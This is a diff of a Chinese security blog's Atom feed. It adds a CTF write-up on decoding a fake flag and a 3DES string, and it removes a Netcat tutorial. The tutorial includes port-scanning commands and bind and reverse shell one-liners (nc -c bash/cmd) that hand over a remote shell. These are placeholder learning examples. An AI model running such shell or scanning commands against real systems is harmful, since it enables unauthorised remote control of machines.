@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://da4er.top/"/>
-  <updated>2020-02-07T14:59:08.064Z</updated>
+  <updated>2020-02-07T15:27:59.478Z</updated>
   <id>https://da4er.top/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2.7 [SUCTF 2019]Game</title>
+    <link href="https://da4er.top/2-7-SUCTF-2019-Game.html"/>
+    <id>https://da4er.top/2-7-SUCTF-2019-Game.html</id>
+    <published>2020-02-07T15:25:55.000Z</published>
+    <updated>2020-02-07T15:27:59.478Z</updated>
+    
+    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong><br><img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image"><br><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong><br><img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image"><br>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag<br><img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image"><br>得到flag：flag{U_F0und_1t}</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。&lt;/strong&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>2.7 [HITCON 2017]SSRFme</title>
@@ -502,32 +528,6 @@
       
         &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。&lt;/p&gt;
 &lt;h2 id=&quot;一-有可显字段——使用常规注入法&quot;&gt;&lt;a hre
-      
-    
-    </summary>
-    
-    
-      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>nc详解</title>
-    <link href="https://da4er.top/nc%E8%AF%A6%E8%A7%A3.html"/>
-    <id>https://da4er.top/nc%E8%AF%A6%E8%A7%A3.html</id>
-    <published>2019-11-21T07:35:03.000Z</published>
-    <updated>2020-02-07T12:11:32.420Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>Nc全名为Netcat，网络工具中的瑞士军刀。<br>主要功能为：<br>1.侦听模式/传输模式<br>2.telnet/获取banner信息<br>3.传输文本信息<br>4.传输文件/目录<br>5.加密传输文件<br>6.远程控制/木马<br>7.加密所有流量<br>8.流媒体服务器<br>9.远程克隆硬盘<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p><h2 id="二-telnet-获取banner信息"><a href="#二-telnet-获取banner信息" class="headerlink" title="二.telnet/获取banner信息"></a>二.telnet/获取banner信息</h2><p>-n 参数：只接收ip，没有dns解析<br>-v 参数：返回详细信息<br>我们先来解析一下要连接的ip地址：<br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>用nc -nv 连接目标的80端口<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"></p><h2 id="三-传输文本信息"><a href="#三-传输文本信息" class="headerlink" title="三.传输文本信息"></a>三.传输文本信息</h2><p>-l：设置为监听模式<br>-p：指定一个开放的端口<br>用-l -p参数将目标设置为服务器，并开放一个端口等待连接<br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br>我们可以用nc进行聊天：<br><img src="/nc%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"></p><h2 id="四-传输文件或目录"><a href="#四-传输文件或目录" class="headerlink" title="四.传输文件或目录"></a>四.传输文件或目录</h2><p>Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。<br>正向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&lt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444 &gt;2.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p><p>反向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&gt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444&lt;1.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"></p><h2 id="五-Nc端口扫描"><a href="#五-Nc端口扫描" class="headerlink" title="五.Nc端口扫描"></a>五.Nc端口扫描</h2><p>nc -nvz 开启端口扫描 默认扫描tcp端口<br>nc -nvzu 扫描udp端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p><h2 id="六-远程控制"><a href="#六-远程控制" class="headerlink" title="六.远程控制"></a>六.远程控制</h2><p>正向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -c bash&#x2F;cmd</span><br><span class="line">nc -nv ip</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令<br><br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"></p><p>反向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ip port</span><br><span class="line">nc -nv ip -c bash&#x2F;cmd</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"></p><p>好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;一-简介&quot;&gt;&lt;a href=&quot;#一-简介&quot; class=&quot;headerlink&quot; title=&quot;一.简介&quot;&gt;&lt;/a&gt;一.简介&lt;/h2&gt;&lt;p&gt;Nc全名为Netcat，网络工具中的瑞士军刀。&lt;br&gt;主要功能为：&lt;br&gt;1.侦听模式/传输模式&lt;br&gt;2.telnet/获
       
     
     </summary>
